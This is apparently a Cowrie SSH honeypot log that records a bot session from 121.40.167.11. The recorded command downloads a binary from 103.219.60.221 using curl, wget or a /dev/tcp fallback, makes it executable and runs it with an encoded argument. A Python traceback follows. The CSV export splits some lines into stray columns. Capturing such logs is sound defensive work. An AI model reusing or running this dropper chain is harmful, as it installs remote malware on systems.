@@ -1,0 +1,101 @@
+2023-11-27T04:04:03+0000	[-] Python Version 3.11.2 (main, Mar 13 2023, 12:18:29) [GCC 12.2.0]	Unnamed: 2	Unnamed: 3	Unnamed: 4
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xba'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xd4'			
+2023-11-30T21:36:27+0000	"[HoneyPotSSHTransport,21,121.40.167.11] CMD: nohup $SHELL -c ""curl http://103.219.60.221:60146/linux"		/t	"mp/bn6WH55NVl; if [ ! -f /tmp/bn6WH55NVl ]; then wget http://103.219.60.221:60146/linux -O /tmp/bn6WH55NVl; fi; if [ ! -f /tmp/bn6WH55NVl ]; then exec 6<>/dev/tcp/103.219.60.221/60146 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/bn6WH55NVl && chmod +x /tmp/bn6WH55NVl && /tmp/bn6WH55NVl ptBw3BO3Pd85wDmpDt5zwdHdwHDYFrk6wDHWPbcS3XDe2tvDe9oQqD7XIN83txHUct7a3t551BqvP98w3S+hDt5wycXaxnXCEaE51DbePqsZzHXHxdLEb90Wtz7dNNQ5qRHYedDa2sFv3hKgId0wwD2tFtZ3wNrZxmHdEq0h3DLeIaEUwnPF2tHGcd0SrS/aM8A+rRPCcMTYxcFz3BqvP9802S+oFttvyN3FyXPCGKA12DDfP6wA3XHBxdjDb94UqyHaONQ5qRHcedDf3N5w3Bm3Pdwu3z+hGtpxwdjd0HDeFbc41y7fP68O3XXK3dvBctwAoSHcMdchoBTCcMPZ0cZx3RGqL98x2SGrE8J0x8XYwnvaEKg72SDdNrcR2nXe2cXCdN4arz/fM9svrRTCcMnexcF02g6oPto62D+oENhhxN7FwnXUDqg/wDLcPqMW3HDA2svEc8IRoD3AMt43txLdeMrd28Fw3wCoPd8u2j+3Edp23traynfcEak/zjHcO7cS3nPe2t/Hb9kXozneMd85uRTbb8nfxcF3whGqO9Q23j6tGMx1wsXayXPCEqk3wDLfNqMW3HDB2MvIb94RoCHfNtohqBjae8bb2sJ4zBOgId8w2yGrEdVvwdvSynfcEao/zjXaIagY32/F3MXHctYWqT7eOc4+oBPCcMHZxcRzwhGqNdgw3zyhAN13xMXSwm/bGLc+2TjUOakR3nnQ2tnFb9sUtzbdLtw9rBraccHb29Bw3hW3ONcu3z+vDt11yt3bwXLcAKg3wDHYObcX3m/B3dLKd9wRrTijJ8tq/HMRYD6OHurchorXSG18; fi; echo 12345678 > /tmp/.opass; chmod +x /tmp/bn6WH55NVl && /tmp/bn6WH55NVl ptBw3BO3Pd85wDmpDt5zwdHdwHDYFrk6wDHWPbcS3XDe2tvDe9oQqD7XIN83txHUct7a3t551BqvP98w3S+hDt5wycXaxnXCEaE51DbePqsZzHXHxdLEb90Wtz7dNNQ5qRHYedDa2sFv3hKgId0wwD2tFtZ3wNrZxmHdEq0h3DLeIaEUwnPF2tHGcd0SrS/aM8A+rRPCcMTYxcFz3BqvP9802S+oFttvyN3FyXPCGKA12DDfP6wA3XHBxdjDb94UqyHaONQ5qRHcedDf3N5w3Bm3Pdwu3z+hGtpxwdjd0HDeFbc41y7fP68O3XXK3dvBctwAoSHcMdchoBTCcMPZ0cZx3RGqL98x2SGrE8J0x8XYwnvaEKg72SDdNrcR2nXe2cXCdN4arz/fM9svrRTCcMnexcF02g6oPto62D+oENhhxN7FwnXUDqg/wDLcPqMW3HDA2svEc8IRoD3AMt43txLdeMrd28Fw3wCoPd8u2j+3Edp23traynfcEak/zjHcO7cS3nPe2t/Hb9kXozneMd85uRTbb8nfxcF3whGqO9Q23j6tGMx1wsXayXPCEqk3wDLfNqMW3HDB2MvIb94RoCHfNtohqBjae8bb2sJ4zBOgId8w2yGrEdVvwdvSynfcEao/zjXaIagY32/F3MXHctYWqT7eOc4+oBPCcMHZxcRzwhGqNdgw3zyhAN13xMXSwm/bGLc+2TjUOakR3nnQ2tnFb9sUtzbdLtw9rBraccHb29Bw3hW3ONcu3z+vDt11yt3bwXLcAKg3wDHYObcX3m/B3dLKd9wRrTijJ8tq/HMRYD6OHurchorXSG18"" &#UPX!"
+2023-11-30T21:36:27+0000	[HoneyPotSSHTransport,21,121.40.167.11] Command found: nohup /bin/bash -c curl http://103.219.60.221:	60	146	/linux -o /tmp/bn6WH55NVl; if [ ! -f /tmp/bn6WH55NVl ]; then wget http://103.219.60.221:60146/linux -O /tmp/bn6WH55NVl; fi; if [ ! -f /tmp/bn6WH55NVl ]; then exec 6<>/dev/tcp/103.219.60.221/60146 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/bn6WH55NVl && chmod +x /tmp/bn6WH55NVl && /tmp/bn6WH55NVl ptBw3BO3Pd85wDmpDt5zwdHdwHDYFrk6wDHWPbcS3XDe2tvDe9oQqD7XIN83txHUct7a3t551BqvP98w3S+hDt5wycXaxnXCEaE51DbePqsZzHXHxdLEb90Wtz7dNNQ5qRHYedDa2sFv3hKgId0wwD2tFtZ3wNrZxmHdEq0h3DLeIaEUwnPF2tHGcd0SrS/aM8A+rRPCcMTYxcFz3BqvP9802S+oFttvyN3FyXPCGKA12DDfP6wA3XHBxdjDb94UqyHaONQ5qRHcedDf3N5w3Bm3Pdwu3z+hGtpxwdjd0HDeFbc41y7fP68O3XXK3dvBctwAoSHcMdchoBTCcMPZ0cZx3RGqL98x2SGrE8J0x8XYwnvaEKg72SDdNrcR2nXe2cXCdN4arz/fM9svrRTCcMnexcF02g6oPto62D+oENhhxN7FwnXUDqg/wDLcPqMW3HDA2svEc8IRoD3AMt43txLdeMrd28Fw3wCoPd8u2j+3Edp23traynfcEak/zjHcO7cS3nPe2t/Hb9kXozneMd85uRTbb8nfxcF3whGqO9Q23j6tGMx1wsXayXPCEqk3wDLfNqMW3HDB2MvIb94RoCHfNtohqBjae8bb2sJ4zBOgId8w2yGrEdVvwdvSynfcEao/zjXaIagY32/F3MXHctYWqT7eOc4+oBPCcMHZxcRzwhGqNdgw3zyhAN13xMXSwm/bGLc+2TjUOakR3nnQ2tnFb9sUtzbdLtw9rBraccHb29Bw3hW3ONcu3z+vDt11yt3bwXLcAKg3wDHYObcX3m/B3dLKd9wRrTijJ8tq/HMRYD6OHurchorXSG18; fi; echo 12345678 > /tmp/.opass; chmod +x /tmp/bn6WH55NVl && /tmp/bn6WH55NVl ptBw3BO3Pd85wDmpDt5zwdHdwHDYFrk6wDHWPbcS3XDe2tvDe9oQqD7XIN83txHUct7a3t551BqvP98w3S+hDt5wycXaxnXCEaE51DbePqsZzHXHxdLEb90Wtz7dNNQ5qRHYedDa2sFv3hKgId0wwD2tFtZ3wNrZxmHdEq0h3DLeIaEUwnPF2tHGcd0SrS/aM8A+rRPCcMTYxcFz3BqvP9802S+oFttvyN3FyXPCGKA12DDfP6wA3XHBxdjDb94UqyHaONQ5qRHcedDf3N5w3Bm3Pdwu3z+hGtpxwdjd0HDeFbc41y7fP68O3XXK3dvBctwAoSHcMdchoBTCcMPZ0cZx3RGqL98x2SGrE8J0x8XYwnvaEKg72SDdNrcR2nXe2cXCdN4arz/fM9svrRTCcMnexcF02g6oPto62D+oENhhxN7FwnXUDqg/wDLcPqMW3HDA2svEc8IRoD3AMt43txLdeMrd28Fw3wCoPd8u2j+3Edp23traynfcEak/zjHcO7cS3nPe2t/Hb9kXozneMd85uRTbb8nfxcF3whGqO9Q23j6tGMx1wsXayXPCEqk3wDLfNqMW3HDB2MvIb94RoCHfNtohqBjae8bb2sJ4zBOgId8w2yGrEdVvwdvSynfcEao/zjXaIagY32/F3MXHctYWqT7eOc4+oBPCcMHZxcRzwhGqNdgw3zyhAN13xMXSwm/bGLc+2TjUOakR3nnQ2tnFb9sUtzbdLtw9rBraccHb29Bw3hW3ONcu3z+vDt11yt3bwXLcAKg3wDHYObcX3m/B3dLKd9wRrTijJ8tq/HMRYD6OHurchorXSG18 &
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xe0'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xc4'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xc4'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x90'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x95'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xbb'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xfb'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xff'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x85'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x84'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x1f'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xdf'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xdd'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xf6'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xed'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xc0'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x13'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'			
+2023-11-30T21:36:27+0000	[HoneyPotSSHTransport,21,121.40.167.11] CMD: >A@/ X'8ELFXLL			
+2023-11-30T21:36:27+0000	[HoneyPotSSHTransport,21,121.40.167.11] exception: No closing quotation			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x13'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xdf'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xd6'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xc6'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xbe'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x12'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x0f'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xc4'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xbe'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xee'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xbd'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x93'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xcd'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xfe'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xc8'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xac'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xf2'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xf8'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xb9'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xbf'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xe7'			
+2023-11-30T21:36:27+0000	[cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x07'			
+2023-11-30T21:36:27+0000	[HoneyPotSSHTransport,21,121.40.167.11] Received CTRL-D, exiting..			
+2023-11-30T21:36:27+0000	[twisted.conch.ssh.session#info] exitCode: 0			
+2023-11-30T21:36:27+0000	[cowrie.ssh.connection.CowrieSSHConnection#debug] sending request b'exit-status'			
+2023-11-30T21:36:27+0000	[HoneyPotSSHTransport,21,121.40.167.11] Closing TTY Log: var/lib/cowrie/tty/b5199eb6512b19bb267b95e69	f3	5a7	fb70f59eb2532519b54f063d78c813bb70 after 7 seconds
+2023-11-30T21:36:27+0000	[cowrie.ssh.connection.CowrieSSHConnection#info] sending close 0			
+2023-11-30T21:36:27+0000	[HoneyPotSSHTransport,21,121.40.167.11] Unhandled Error			
+"	Traceback (most recent"	call last):			
+"	  File ""/cowrie/cowrie-"	"env/lib/python3.11/site-packages/twisted/python/log.py"", line 96, in callWithLogger"			
+"	    return callWithCont"	"ext({""system"": lp}, func, *args, **kw)"			
+"	  File ""/cowrie/cowrie-"	"env/lib/python3.11/site-packages/twisted/python/log.py"", line 80, in callWithContext"			
+"	    return context.call"	({ILogContext: newCtx}, func, *args, **kw)			
+"	  File ""/cowrie/cowrie-"	"env/lib/python3.11/site-packages/twisted/python/context.py"", line 117, in callWithContext"			
+"	    return self.current"	Context().callWithContext(ctx, func, *args, **kw)			
+"	  File ""/cowrie/cowrie-"	"env/lib/python3.11/site-packages/twisted/python/context.py"", line 82, in callWithContext"			
+"	    return func(*args,"	**kw)			
+"	--- <exception caught h"	ere> ---			
+"	  File ""/cowrie/cowrie-"	"env/lib/python3.11/site-packages/twisted/internet/posixbase.py"", line 482, in _doReadOrWrite"			
+"	    why = selectable.do"	Read()			
+"	  File ""/cowrie/cowrie-"	"env/lib/python3.11/site-packages/twisted/internet/tcp.py"", line 248, in doRead"			
+"	    return self._dataRe"	ceived(data)			
+"	  File ""/cowrie/cowrie-"	"env/lib/python3.11/site-packages/twisted/internet/tcp.py"", line 253, in _dataReceived"			
+"	    rval = self.protoco"	l.dataReceived(data)			
+"	  File ""/cowrie/cowrie-"	"git/src/cowrie/ssh/transport.py"", line 144, in dataReceived"			
+"	    self.dispatchMessag"	e(messageNum, packet[1:])			
+"	  File ""/cowrie/cowrie-"	"git/src/cowrie/ssh/transport.py"", line 148, in dispatchMessage"			
+"	    transport.SSHServer"	Transport.dispatchMessage(self, messageNum, payload)			
+"	  File ""/cowrie/cowrie-"	"env/lib/python3.11/site-packages/twisted/conch/ssh/transport.py"", line 800, in dispatchMessage"			
+"	    self.service.packet"	Received(messageNum, payload)			
+"	  File ""/cowrie/cowrie-"	"env/lib/python3.11/site-packages/twisted/conch/ssh/service.py"", line 50, in packetReceived"			
+"	    return f(packet)"				
+"	  File ""/cowrie/cowrie-"	"env/lib/python3.11/site-packages/twisted/conch/ssh/connection.py"", line 265, in ssh_CHANNEL_DATA"			
+"	    channel.dataReceive"	d(data)			
+"	  File ""/cowrie/cowrie-"	"env/lib/python3.11/site-packages/twisted/conch/ssh/session.py"", line 165, in dataReceived"			
+"	    self.client.transpo"	rt.write(data)			
+"	  File ""/cowrie/cowrie-"	"env/lib/python3.11/site-packages/twisted/conch/ssh/session.py"", line 225, in write"			
+"	    self.proto.dataRece"	ived(data)			
